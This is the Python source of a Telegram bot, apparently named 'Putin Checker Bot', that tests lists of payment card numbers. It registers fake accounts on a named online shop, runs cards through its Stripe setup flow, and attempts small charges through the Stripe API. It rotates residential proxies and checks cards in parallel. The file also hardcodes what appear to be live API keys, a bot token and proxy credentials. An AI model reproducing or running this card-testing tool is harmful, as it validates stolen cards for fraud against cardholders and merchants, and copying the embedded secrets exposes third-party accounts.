import asyncio
import logging
import time
from datetime import datetime
import random
import re
from bs4 import BeautifulSoup
import httpx
import os
from typing import Optional, Dict, List
from collections import defaultdict

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.fsm.storage.memory import MemoryStorage

# Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN", "7730148236:AAHBzpUIKbjTOJuR19hJPcMU427-Oojy9BU")
STRIPE_API_KEY = os.getenv("STRIPE_API_KEY", "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")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "8014397974")

# Proxy list - add multiple proxies here
PROXY_LIST = [
    "http://geonode_8jyRQvRui6-type-residential:305649b7-1a2d-4c8f-8a3a-6505059428ba@proxy.geonode.io:9000",
    "http://mQHCs1JCVFo0g118:FjN7hOaJ4e0EmTKP@geo.g-w.info:10080",
    "http://geonode_8jyRQvRui6-type-residential:305649b7-1a2d-4c8f-8a3a-6505059428ba@proxy.geonode.io:9000",
    "http://user-PP_9BYQ1AXXWR-country-EU-plan-luminati:2ms5yoht@bd.porterproxies.com:8888",
    "http://geonode_8jyRQvRui6-type-residential:305649b7-1a2d-4c8f-8a3a-6505059428ba@proxy.geonode.io:9000",
    "http://user-PP_9BYQ1AXXWR-country-EU-plan-luminati:2ms5yoht@bd.porterproxies.com:8888"
    # Add more proxies:
    # "http://user:pass@proxy2.com:8080",
    # "http://user:pass@proxy3.com:8080",
]

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Rate limiting
last_chk_time: Dict[int, datetime] = {}
last_mass_time: Dict[int, datetime] = {}

# Bot and Dispatcher
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ==================== OPTIMIZED PROXY MANAGER ====================
class ProxyManager:
    """Manage multiple proxies with rotation and statistics"""
    
    def __init__(self, proxy_list: List[str]):
        self.proxies = [p for p in proxy_list if p]
        self.current_index = 0
        self.working_proxies = []
        self.proxy_stats = defaultdict(lambda: {"success": 0, "fail": 0, "avg_time": 0})
        self.lock = asyncio.Lock()
        logger.info(f"📡 Loaded {len(self.proxies)} proxies")
    
    async def test_proxy(self, proxy: str) -> bool:
        """Test if proxy is working"""
        try:
            async with httpx.AsyncClient(proxies=proxy, timeout=10) as client:
                response = await client.get("https://httpbin.org/ip")
                return response.status_code == 200
        except:
            return False
    
    async def initialize(self):
        """Test all proxies in parallel and filter working ones"""
        logger.info("🔄 Testing proxies in parallel...")
        
        # Test all proxies concurrently
        tasks = [self.test_proxy(proxy) for proxy in self.proxies]
        results = await asyncio.gather(*tasks)
        
        for proxy, is_working in zip(self.proxies, results):
            if is_working:
                self.working_proxies.append(proxy)
                logger.info(f"✅ Working proxy: {proxy[:30]}...")
            else:
                logger.warning(f"❌ Dead proxy: {proxy[:30]}...")
        
        if not self.working_proxies:
            logger.warning("⚠️ No working proxies, will proceed without proxy")
        else:
            logger.info(f"✅ {len(self.working_proxies)} working proxies ready")
    
    def get_best_proxy(self) -> Optional[str]:
        """Get proxy with best success rate"""
        if not self.working_proxies:
            return None
        
        # If no stats yet, return random
        if not self.proxy_stats:
            return random.choice(self.working_proxies)
        
        # Find proxy with best success rate
        best_proxy = None
        best_score = -1
        
        for proxy in self.working_proxies:
            stats = self.proxy_stats[proxy]
            total = stats["success"] + stats["fail"]
            if total == 0:
                score = 0.5  # Neutral score for untested
            else:
                score = stats["success"] / total
            
            if score > best_score:
                best_score = score
                best_proxy = proxy
        
        return best_proxy or random.choice(self.working_proxies)
    
    def get_random_proxy(self) -> Optional[str]:
        """Get random working proxy"""
        if not self.working_proxies:
            return None
        return random.choice(self.working_proxies)
    
    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in rotation"""
        if not self.working_proxies:
            return None
        proxy = self.working_proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.working_proxies)
        return proxy
    
    async def record_result(self, proxy: Optional[str], success: bool, response_time: float):
        """Record proxy performance"""
        if not proxy:
            return
        
        async with self.lock:
            stats = self.proxy_stats[proxy]
            if success:
                stats["success"] += 1
            else:
                stats["fail"] += 1
            
            # Update average response time
            total = stats["success"] + stats["fail"]
            stats["avg_time"] = ((stats["avg_time"] * (total - 1)) + response_time) / total

# Initialize proxy manager
proxy_manager = ProxyManager(PROXY_LIST)

# ==================== UTILITIES ====================
def generate_fake_email() -> str:
    """Generate random email"""
    random_string = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com']
    return f"{random_string}@{random.choice(domains)}"

def parse_card_details(card_string: str) -> tuple:
    """Parse card details from string"""
    card_string = card_string.strip()
    cc, mm, yy, cvv = None, None, None, None

    match = re.search(r'(\d{13,19})[|/\s-]+(\d{1,2})[|/\s-]+(\d{2}|\d{4})[|/\s-]+(\d{3,4})', card_string)
    if match:
        cc, mm, yy, cvv = match.groups()
    else:
        temp = card_string
        cc_match = re.search(r'\d{13,19}', temp)
        if cc_match: 
            cc = cc_match.group(0)
            temp = temp.replace(cc, '', 1)
        mm_match = re.search(r'(?:MM:|M:)?\s*(\d{1,2})(?!\d)', temp)
        if mm_match: 
            mm = mm_match.group(1)
            temp = temp.replace(mm_match.group(0), '', 1)
        yy_match = re.search(r'(?:YY:|Y:)?\s*(\d{2}|\d{4})(?!\d)', temp)
        if yy_match: 
            yy = yy_match.group(1)
            temp = temp.replace(yy_match.group(0), '', 1)
        cvv_match = re.search(r'(?:CVV:|CVC:)?\s*(\d{3,4})(?!\d)', temp)
        if cvv_match: 
            cvv = cvv_match.group(1)

    if not all([cc, mm, yy, cvv]):
        return None, None, None, None

    try:
        mm_int = int(mm)
        if not (1 <= mm_int <= 12):
            return None, None, None, None
        current_year = datetime.now().year
        if len(yy) == 2:
            yy_full = int(f"20{yy}") if int(yy) >= (current_year % 100) else int(f"19{yy}")
        else:
            yy_full = int(yy)
        if not (current_year <= yy_full <= current_year + 15):
            return None, None, None, None
    except:
        return None, None, None, None

    return cc, str(mm_int).zfill(2), str(yy_full)[-2:], cvv

def format_card_result(status: str, card: str, message: str, extra_info: str = None) -> str:
    """Format card check result"""
    if status == "approved":
        emoji, status_text = "✅", "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
    elif status == "declined":
        emoji, status_text = "❌", "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
    elif status == "error":
        emoji, status_text = "⚠️", "𝗘𝗥𝗥𝗢𝗥"
    else:
        emoji, status_text = "ℹ️", "𝗜𝗡𝗙𝗢"
    
    result = f"{emoji} <b>{status_text}</b>\n━━━━━━━━━━━━━━━\n<code>{card}</code>\n━━━━━━━━━━━━━━━\n<b>Response:</b> {message}\n"
    if extra_info:
        result += f"<b>Info:</b> {extra_info}\n"
    result += "━━━━━━━━━━━━━━━"
    return result

def clean_error_message(error_str: str) -> str:
    """Clean error messages"""
    error_str = str(error_str)
    if "for url:" in error_str.lower():
        error_str = error_str.split("for url:")[0].strip()
    if "https://" in error_str or "http://" in error_str:
        error_str = "Service temporarily unavailable"
    return error_str[:200]

# ==================== BAHAMA CHECKER ====================
async def bahama_check_card(card: str) -> str:
    """Check card via bahamabos.com gateway"""
    cc, mm, yy, cvv = card.split("|")
    start_time = time.time()
    
    proxy = proxy_manager.get_best_proxy()
    success = False
    
    try:
        async with httpx.AsyncClient(proxies=proxy, timeout=30, follow_redirects=True) as client:
            mail = generate_fake_email()
            
            headers = {
                'authority': 'bahamabos.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
            }
            
            # Step 1: Get registration page
            response = await client.get('https://bahamabos.com/my-account/', headers=headers)
            if response.status_code != 200:
                raise Exception("Failed to load page")
            
            soup = BeautifulSoup(response.text, 'lxml')
            nonce = soup.find(id="woocommerce-register-nonce")
            if not nonce:
                raise Exception("Nonce not found")
            nonce_value = nonce.get("value")
            
            # Step 2: Register account
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://bahamabos.com',
                'referer': 'https://bahamabos.com/my-account/',
                'sec-fetch-site': 'same-origin'
            })
            
            register_data = {
                'email': mail,
                'woocommerce-register-nonce': nonce_value,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            
            response = await client.post('https://bahamabos.com/my-account/', headers=headers, data=register_data)
            if response.status_code != 200:
                raise Exception("Registration failed")
            
            # Step 3: Get add payment method page
            headers.pop('content-type', None)
            headers['referer'] = 'https://bahamabos.com/my-account/'
            
            response = await client.get('https://bahamabos.com/my-account/add-payment-method/', headers=headers)
            if response.status_code != 200:
                raise Exception("Failed to load payment page")
            
            soup = BeautifulSoup(response.text, 'lxml')
            
            # Extract AJAX nonce
            ajax_nonce = None
            for script in soup.find_all('script'):
                if script.string and "createAndConfirmSetupIntentNonce" in script.string:
                    match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', script.string)
                    if match:
                        ajax_nonce = match.group(1)
                        break
            
            if not ajax_nonce:
                raise Exception("Ajax nonce not found")
            
            # Step 4: Create Stripe payment method
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': headers['user-agent'],
            }
            
            stripe_data = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": yy,
                "card[exp_month]": mm,
                "billing_details[address][country]": "IN",
                "key": "pk_live_axb2b6B9U2aIqQq93VRd6qF6009oO6P3ds",
            }
            
            response = await client.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
            
            if response.status_code != 200:
                pm_json = response.json()
                error_msg = pm_json.get("error", {}).get("message", "Card declined")
                time_taken = time.time() - start_time
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("declined", card, error_msg, f"Gateway: Bahama | Time: {time_taken:.2f}s")
            
            pm_json = response.json()
            pm_id = pm_json.get("id")
            
            if not pm_id:
                raise Exception("Payment method ID not found")
            
            # Step 5: Confirm setup intent
            final_headers = headers.copy()
            final_headers.update({
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'referer': 'https://bahamabos.com/my-account/add-payment-method/',
                'x-requested-with': 'XMLHttpRequest',
            })
            
            final_data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }
            
            response = await client.post('https://bahamabos.com/wp-admin/admin-ajax.php', headers=final_headers, data=final_data)
            
            if response.status_code == 403:
                raise Exception("Service temporarily unavailable")
            
            if response.status_code != 200:
                raise Exception("Service temporarily unavailable")
            
            result_json = response.json()
            time_taken = time.time() - start_time
            success = True
            
            if result_json.get("success"):
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("approved", card, "Card Approved Successfully! ✅", f"Gateway: Bahama | Time: {time_taken:.2f}s")
            else:
                error_data = result_json.get("data", {})
                error = error_data.get("error", {})
                error_msg = error.get("message", "Payment declined")
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("declined", card, error_msg, f"Gateway: Bahama | Time: {time_taken:.2f}s")
    
    except Exception as e:
        time_taken = time.time() - start_time
        await proxy_manager.record_result(proxy, False, time_taken)
        logger.error(f"Bahama check failed: {e}")
        return format_card_result("error", card, "Service temporarily unavailable", f"Gateway: Bahama | Time: {time_taken:.2f}s")

# ==================== STRIPE DIRECT CHECKER ====================
async def stripe_direct_check_card(card: str) -> str:
    """Check card via Stripe Direct API"""
    cc, mm, yy, cvv = card.split("|")
    start_time = time.time()
    
    proxy = proxy_manager.get_best_proxy()
    
    try:
        full_year = f"20{yy}" if len(yy) == 2 else yy
        
        async with httpx.AsyncClient(proxies=proxy, timeout=15) as client:
            # Create payment method
            pm_data = {
                "type": "card",
                "card[number]": cc,
                "card[exp_month]": mm.zfill(2),
                "card[exp_year]": full_year,
                "card[cvc]": cvv,
                "billing_details[name]": "John Doe",
                "billing_details[email]": generate_fake_email(),
                "billing_details[address][line1]": "123 Main St",
                "billing_details[address][city]": "New York",
                "billing_details[address][state]": "NY",
                "billing_details[address][postal_code]": "10001",
                "billing_details[address][country]": "US",
            }
            
            pm_headers = {
                "Authorization": f"Bearer {STRIPE_API_KEY}",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            
            response = await client.post("https://api.stripe.com/v1/payment_methods", headers=pm_headers, data=pm_data)
            pm_json = response.json()
            
            if response.status_code != 200:
                error_msg = pm_json.get("error", {}).get("message", "Unknown error")
                decline_code = pm_json.get("error", {}).get("decline_code", "")
                if decline_code:
                    error_msg += f" ({decline_code})"
                time_taken = time.time() - start_time
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("declined", card, error_msg, f"Gateway: Stripe Direct | Time: {time_taken:.2f}s")
            
            pm_id = pm_json.get("id")
            if not pm_id:
                time_taken = time.time() - start_time
                await proxy_manager.record_result(proxy, False, time_taken)
                return format_card_result("error", card, "Failed to create payment method", f"Gateway: Stripe Direct | Time: {time_taken:.2f}s")
            
            # Create payment intent
            pi_data = {
                "amount": "100",
                "currency": "usd",
                "payment_method": pm_id,
                "confirm": "true",
                "off_session": "true",
                "description": "Auth test",
            }
            
            response = await client.post("https://api.stripe.com/v1/payment_intents", headers=pm_headers, data=pi_data)
            pi_json = response.json()
            
            time_taken = time.time() - start_time
            
            if response.status_code == 200:
                status = pi_json.get("status")
                if status == "succeeded":
                    await proxy_manager.record_result(proxy, True, time_taken)
                    return format_card_result("approved", card, "Card Charged Successfully! ✅", f"Gateway: Stripe Direct | Time: {time_taken:.2f}s")
                elif status == "requires_payment_method":
                    error = pi_json.get("last_payment_error", {})
                    error_msg = error.get("message", "Payment method required")
                    decline_code = error.get("decline_code", "")
                    if decline_code:
                        error_msg += f" ({decline_code})"
                    await proxy_manager.record_result(proxy, True, time_taken)
                    return format_card_result("declined", card, error_msg, f"Gateway: Stripe Direct | Time: {time_taken:.2f}s")
                elif status == "requires_action":
                    await proxy_manager.record_result(proxy, True, time_taken)
                    return format_card_result("declined", card, "3D Secure required", f"Gateway: Stripe Direct | Time: {time_taken:.2f}s")
                else:
                    await proxy_manager.record_result(proxy, True, time_taken)
                    return format_card_result("declined", card, f"Status: {status}", f"Gateway: Stripe Direct | Time: {time_taken:.2f}s")
            else:
                error = pi_json.get("error", {})
                error_msg = error.get("message", "Unknown error")
                decline_code = error.get("decline_code", "")
                if decline_code:
                    error_msg += f" ({decline_code})"
                await proxy_manager.record_result(proxy, True, time_taken)
                return format_card_result("declined", card, error_msg, f"Gateway: Stripe Direct | Time: {time_taken:.2f}s")
    
    except Exception as e:
        time_taken = time.time() - start_time
        await proxy_manager.record_result(proxy, False, time_taken)
        logger.error(f"Stripe Direct check failed: {e}")
        return format_card_result("error", card, clean_error_message(str(e)), f"Gateway: Stripe Direct | Time: {time_taken:.2f}s")

# ==================== COMMAND HANDLERS ====================
@dp.message(Command("start"))
async def cmd_start(message: Message):
    """Start command"""
    welcome_msg = (
        "🤖 <b>Welcome to Putin Checker Bot!</b>\n━━━━━━━━━━━━━━━\n\n"
        "<b>Stripe Auth Gateway:</b>\n"
        "• <code>/chk CC|MM|YY|CVV</code> - Single check\n"
        "• <code>/mass</code> - Mass check (parallel)\n\n"
        "<b>Stripe Direct:</b>\n"
        "• <code>/st CC|MM|YY|CVV</code> - Single check\n"
        "• <code>/mst</code> - Mass check (parallel)\n\n"
        "━━━━━━━━━━━━━━━\n⚡ <b>Fast • Parallel • Optimized</b>"
    )
    await message.answer(welcome_msg, parse_mode='HTML')

@dp.message(Command("chk"))
async def cmd_chk(message: Message):
    """Bahama Gateway single check"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_chk_time and (current_time - last_chk_time[user_id]).total_seconds() < 5:
        remaining = 5 - (current_time - last_chk_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_chk_time[user_id] = current_time
    
    # Parse command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> <code>/chk CC|MM|YY|CVV</code>\n\n"
            "<b>Example:</b> <code>/chk 4532111111111111|12|25|123</code>\n\n"
            "<b>Gateway:</b> Bahama (bahamabos.com)",
            parse_mode='HTML'
        )
        return
    
    card_input = command_parts[1]
    cc, mm, yy, cvv = parse_card_details(card_input)
    
    if not all([cc, mm, yy, cvv]):
        await message.answer("❌ Invalid card format", parse_mode='HTML')
        return
    
    card = f"{cc}|{mm}|{yy}|{cvv}"
    
    status_msg = await message.answer(
        f"🔄 <b>Bahama Gateway checking...</b>\n<code>{card}</code>",
        parse_mode='HTML'
    )
    
    result = await bahama_check_card(card)
    
    await status_msg.delete()
    await message.answer(result, parse_mode='HTML')

@dp.message(Command("mass"))
async def cmd_mass(message: Message):
    """Bahama Gateway mass check with parallel processing"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_mass_time and (current_time - last_mass_time[user_id]).total_seconds() < 20:
        remaining = 20 - (current_time - last_mass_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_mass_time[user_id] = current_time
    
    # Parse cards
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b>\n<code>/mass\n"
            "4532111111111111|12|25|123\n"
            "5425233430109903|11|26|321</code>\n\n"
            "<b>Gateway:</b> Bahama (bahamabos.com)\n"
            "<b>Mode:</b> Parallel processing",
            parse_mode='HTML'
        )
        return
    
    cards_text = command_parts[1].strip()
    cards_to_check = []
    
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            cc, mm, yy, cvv = parse_card_details(line)
            if all([cc, mm, yy, cvv]):
                cards_to_check.append(f"{cc}|{mm}|{yy}|{cvv}")
    
    if not cards_to_check:
        await message.answer("❌ No valid cards", parse_mode='HTML')
        return
    
    # No limit for parallel processing
    total_cards = len(cards_to_check)
    
    await message.answer(
        f"🚀 Processing {total_cards} cards in parallel via Bahama Gateway...",
        parse_mode='HTML'
    )
    
    # Process all cards in parallel
    start_time = time.time()
    tasks = [bahama_check_card(card) for card in cards_to_check]
    results = await asyncio.gather(*tasks)
    total_time = time.time() - start_time
    
    # Send results
    for idx, result in enumerate(results, 1):
        await message.answer(f"<b>{idx}/{total_cards}</b>\n{result}", parse_mode='HTML')
    
    await message.answer(
        f"✅ Completed {total_cards} cards in {total_time:.2f}s\n"
        f"⚡ Average: {total_time/total_cards:.2f}s per card",
        parse_mode='HTML'
    )

@dp.message(Command("st"))
async def cmd_st(message: Message):
    """Stripe Direct single check"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_chk_time and (current_time - last_chk_time[user_id]).total_seconds() < 5:
        remaining = 5 - (current_time - last_chk_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_chk_time[user_id] = current_time
    
    # Parse command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b> <code>/st CC|MM|YY|CVV</code>\n\n"
            "<b>Example:</b> <code>/st 4532111111111111|12|25|123</code>\n\n"
            "<b>Gateway:</b> Stripe Direct API",
            parse_mode='HTML'
        )
        return
    
    card_input = command_parts[1]
    cc, mm, yy, cvv = parse_card_details(card_input)
    
    if not all([cc, mm, yy, cvv]):
        await message.answer("❌ Invalid card format", parse_mode='HTML')
        return
    
    card = f"{cc}|{mm}|{yy}|{cvv}"
    
    status_msg = await message.answer(
        f"🔄 <b>Stripe Direct checking...</b>\n<code>{card}</code>",
        parse_mode='HTML'
    )
    
    result = await stripe_direct_check_card(card)
    
    await status_msg.delete()
    await message.answer(result, parse_mode='HTML')

@dp.message(Command("mst"))
async def cmd_mst(message: Message):
    """Stripe Direct mass check with parallel processing"""
    user_id = message.from_user.id
    current_time = datetime.now()
    
    # Rate limiting
    if user_id in last_mass_time and (current_time - last_mass_time[user_id]).total_seconds() < 20:
        remaining = 20 - (current_time - last_mass_time[user_id]).total_seconds()
        await message.answer(f"⏳ Wait <code>{remaining:.1f}s</code>", parse_mode='HTML')
        return
    last_mass_time[user_id] = current_time
    
    # Parse cards
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        await message.answer(
            "❌ <b>Usage:</b>\n<code>/mst\n"
            "4532111111111111|12|25|123\n"
            "5425233430109903|11|26|321</code>\n\n"
            "<b>Gateway:</b> Stripe Direct API\n"
            "<b>Mode:</b> Parallel processing",
            parse_mode='HTML'
        )
        return
    
    cards_text = command_parts[1].strip()
    cards_to_check = []
    
    for line in cards_text.split("\n"):
        line = line.strip()
        if line:
            cc, mm, yy, cvv = parse_card_details(line)
            if all([cc, mm, yy, cvv]):
                cards_to_check.append(f"{cc}|{mm}|{yy}|{cvv}")
    
    if not cards_to_check:
        await message.answer("❌ No valid cards", parse_mode='HTML')
        return
    
    # No limit for parallel processing
    total_cards = len(cards_to_check)
    
    await message.answer(
        f"🚀 Processing {total_cards} cards in parallel via Stripe Direct...",
        parse_mode='HTML'
    )
    
    # Process all cards in parallel
    start_time = time.time()
    tasks = [stripe_direct_check_card(card) for card in cards_to_check]
    results = await asyncio.gather(*tasks)
    total_time = time.time() - start_time
    
    # Send results
    for idx, result in enumerate(results, 1):
        await message.answer(f"<b>{idx}/{total_cards}</b>\n{result}", parse_mode='HTML')
    
    await message.answer(
        f"✅ Completed {total_cards} cards in {total_time:.2f}s\n"
        f"⚡ Average: {total_time/total_cards:.2f}s per card",
        parse_mode='HTML'
    )

# ==================== MAIN ====================
async def main():
    """Main function to start bot"""
    logger.info("🤖 Bot starting...")
    
    # Initialize proxies in parallel
    await proxy_manager.initialize()
    
    logger.info("✅ Bot started successfully!")
    await dp.start_polling(bot)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 Bot stopped")
    except Exception as e:
        logger.error(f"Critical error: {e}")
